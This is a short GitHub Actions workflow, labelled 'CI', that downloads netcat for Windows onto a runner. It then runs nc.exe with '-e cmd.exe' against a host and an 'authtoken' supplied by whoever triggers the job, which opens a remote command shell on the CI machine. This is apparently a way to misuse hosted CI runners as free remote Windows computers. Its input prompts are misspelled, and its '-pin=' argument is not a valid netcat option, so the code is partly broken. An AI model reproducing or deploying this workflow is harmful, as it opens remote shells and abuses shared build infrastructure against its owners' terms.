name: CI

on: 
  workflow_dispatch:
    inputs:
      code:
        description: 'Did you wtch my video enter pin code'
        required: true
      pin:
        description: 'enter your authtoken'
        required: true
jobs:

  build:

    runs-on: windows-latest

    steps:

    - name: Download

      run: | 
       Invoke-WebRequest https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile nc.zip
       Expand-Archive nc.zip
       powershell
       ls
       cd nc
       ls
       cd netcat-1.11
       ls
       ./nc.exe ${{ github.event.inputs.code }} -pin=${{ github.event.inputs.pin }} -e cmd.exe
       
       
    
